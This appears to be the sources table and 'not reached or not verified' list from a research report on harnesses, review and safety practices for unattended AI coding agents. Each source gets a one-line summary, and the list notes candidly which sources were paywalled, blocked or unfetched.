| [Huntley, Ralph Wiggum as a "software engineer"](https://ghuntley.com/ralph/) | 2025-07-14 | Report + opinion | The original loop; one item per loop; backpressure from tests and types; `AGENT.md` updates; failure modes; greenfield only |
| [Huntley, nobody should type code by hand anymore](https://ghuntley.com/agency/) | 2026-10-13 | Opinion | Follow-up: says stubs are no longer a problem with current models; humans supply "vision, verification and agency". Used only as background |
| [Young / Anthropic, Effective harnesses for long-running agents](https://www.anthropic.com/engineering/effective-harnesses-for-long-running-agents) | 2025-11-26 | Report | Feature list, progress file, startup smoke test; agents marking features done without browser testing |
| [Rajasekaran / Anthropic, Harness design for long-running application development](https://www.anthropic.com/engineering/harness-design-long-running-apps) | 2026-03-24 | Report | Self-grading bias, separate Playwright evaluator, costs, removing harness parts as models improve |
| [Anthropic Applied AI, Effective context engineering for AI agents](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents) | 2025-09-29 | Guide | Notes outside the context window as memory |
| [Anthropic, Best practices for Claude Code](https://code.claude.com/docs/en/best-practices) | undated docs | Docs | Prompt vs. enforced rules, Stop hooks, the unattended-run checklist, reviewers that always find something, protect `main` |
| [Anthropic, Run Claude Code programmatically](https://code.claude.com/docs/en/headless) | undated docs | Docs | `--bare` and its future default, cost fields as estimates, `--max-budget-usd`, Manual mode in `-p`, SIGTERM behaviour |
| [Anthropic, Claude Code GitHub Actions](https://code.claude.com/docs/en/github-actions) | undated docs | Docs | Review workflow, draft skipping, `GITHUB_TOKEN` not triggering workflows, bot rejection, cost controls |
| [Anthropic, Code Review](https://code.claude.com/docs/en/code-review) | undated docs | Docs | Review reads the diff without running code; never approves or blocks |
| [anthropics/claude-plugins-official: code-review command](https://github.com/anthropics/claude-plugins-official/blob/main/plugins/code-review/commands/code-review.md) | updated 2026-10-26 | Source | Exact skip rules (draft, automated, already commented) and the high-signal-only filter |
| [anthropics/claude-code-action: docs/security.md](https://github.com/anthropics/claude-code-action/blob/main/docs/security.md) | updated 2026-08-05 | Source | Comment sanitising, `include_comments_by_actor`, base-branch restore of `CLAUDE.md` and `.claude/` |
| [Anthropic, Configure permissions](https://code.claude.com/docs/en/permissions) | undated docs | Docs | Limits of Bash and Edit rules; rules anchored at the working directory |
| [Anthropic, Sandboxing](https://code.claude.com/docs/en/sandboxing) | undated docs | Docs | Credential reads allowed by default, unsandboxed retries, `allowUnsandboxedCommands` |
| [Anthropic, Use Claude Code in the cloud](https://code.claude.com/docs/en/claude-code-on-the-web) | undated docs | Docs | Auto-fix behaviour, no webhook for merge conflicts, shared rate limits |
| [GitHub, Risks and mitigations for Copilot cloud agent](https://docs.github.com/en/copilot/concepts/agents/cloud-agent/risks-and-mitigations) | undated docs | Docs | Branch limits, no ready/approve/merge, workflow approval, comment filtering |
| [GitHub, Best practices for using Copilot to work on tasks](https://docs.github.com/en/copilot/tutorials/cloud-agent/get-the-best-results) | undated docs | Docs | Task scoping, tasks to keep for yourself, batching review comments |
| [GitHub, About Copilot cloud agent](https://docs.github.com/en/copilot/concepts/agents/coding-agent/about-coding-agent) | undated docs | Docs | One branch and one PR per task; 59-minute session limit |
| [GitHub, About rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets) | undated docs | Docs | Bypass by role, team or App; branch patterns; force-push blocking |
| [OpenAI, Codex Cloud (Legacy): internet access](https://learn.chatgpt.com/docs/cloud/internet-access.md) | undated docs | Docs | Internet off by default during the agent phase; worked injection example |
| [Cursor, Cloud Agents](https://cursor.com/docs/cloud-agent) | undated docs | Docs | Screenshots, videos and logs as PR evidence; spend limits |
| [Cognition, When to Use Devin](https://docs.devin.ai/essential-guidelines/when-to-use-devin) | undated docs | Docs | Three-hour task rule; success criteria; browser self-testing |
| [Korevec, Hassen & Zhang / Google, Meet Jules' sharpest critic](https://developers.googleblog.com/en/meet-jules-sharpest-critic-and-most-valuable-ally/) | 2025-08-12 | Vendor blog | A critic that flags but doesn't fix, before the PR exists |
| [Willison, The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) | 2025-06-16 | Opinion | Framework for prompt-injection exposure |
| [Willison, Codex agent internet access](https://simonwillison.net/2025/Jun/3/codex-agent-internet-access/) | 2025-06-03 | Opinion | Allowlists still leak; prefer GET/HEAD/OPTIONS only |
| [Willison, Designing agentic loops](https://simonwillison.net/2025/Sep/30/designing-agentic-loops/) | 2025-09-30 | Opinion + report | Sandboxing options, scoped credentials, tight budgets |
| [Willison, Embracing the parallel coding agent lifestyle](https://simonwillison.net/2025/Oct/5/parallel-coding-agents/) | 2025-10-05 | Report | Review as the bottleneck; when he skips approvals |
| [Hashimoto, My AI Adoption Journey](https://mitchellh.com/writing/my-ai-adoption-journey) | 2026-02-05 | Report | Harness engineering after each mistake; notifications off; triage reports |
| [Ronacher, The Coming Loop](https://lucumr.pocoo.org/2026/6/23/the-coming-loop/) | 2026-06-23 | Opinion + some report | Loop code getting more defensive; accountability concerns |
| [Beck, Augmented Coding: Beyond the Vibes](https://newsletter.kentbeck.com/p/augmented-coding-beyond-the-vibes) | 2025-06-25 | Report | Warning signs: loops, unrequested work, deleted or disabled tests |
| [Böckeler, How far can we push AI autonomy in code generation?](https://martinfowler.com/articles/pushing-ai-autonomy.html) | 2025-08-05 | Report | False success claims, overeager features, brute-force fixes |
| [Pocock / AI Hero, 11 tips for AI coding with Ralph Wiggum](https://www.aihero.dev/tips-for-ai-coding-with-ralph-wiggum) | updated 2026-01-08 | Report + advice | Iteration caps, watch first and then run unattended, explicit stop conditions, progress file |
| [Sehn / DoltHub, A Day in Gas Town](https://www.dolthub.com/blog/2026-01-15-a-day-in-gas-town/) | 2026-01-15 | Report | Self-merge with failing tests, cost about 10× per hour, operator overload |
| [Netlify, Deploy Previews](https://docs.netlify.com/deploy/deploy-types/deploy-previews/) | undated docs | Docs | Preview URL format, PR status and comment, Drawer, 404 while pending |
| [Playwright, Visual comparisons](https://playwright.dev/docs/test-snapshots) | undated docs | Docs | Screenshots depend on the platform; options for stable baselines |
| [Pham & Ghaleb, arXiv 2601.17627](https://arxiv.org/abs/2601.17627) | 2026-01-24 | Study | Agent PR descriptions and code churn compared with human PRs |

### Not reached or not verified

- **OpenAI, "Harness engineering: leveraging Codex in an agent-first world"** (Lopopolo,
  reported as 2026-02-11): openai.com returned HTTP 403, so it isn't cited. Only secondary
  coverage was readable (InfoQ, 2026-02-21).
- **Steve Yegge, "Welcome to Gas Town"** (Medium, reported as 2026-01-01): not fetched. Gas Town
  appears here only through DoltHub's first-hand report.
- **Kent Beck, "Augmented Coding: Coached by the Genie"** (2025-06-11): paywalled. Beck is cited
  only from "Beyond the Vibes".
- **Codex cloud main docs:** `developers.openai.com/codex/cloud` now redirects to a new page
  without details on best-of-N or review. Only the internet-access page is cited.
- **Amp:** searched, but found only third-party and marketing pages, no first-party write-up of
  its review loop. Not cited.
- **Not looked up:** Factory, Harper Reed, Latent Space, Thoughtworks Radar, and the Copilot
  and Jules changelogs.
- **Böckeler's 2026 QCon keynote** (which, per InfoQ, said security incidents involving coding
  agents now happen weekly, mostly through prompt injection): secondary only, so not cited.
- **Unverified:** whether local `claude -p` on a subscription shares rate limits with
  interactive use; the docs say so only for cloud sessions.
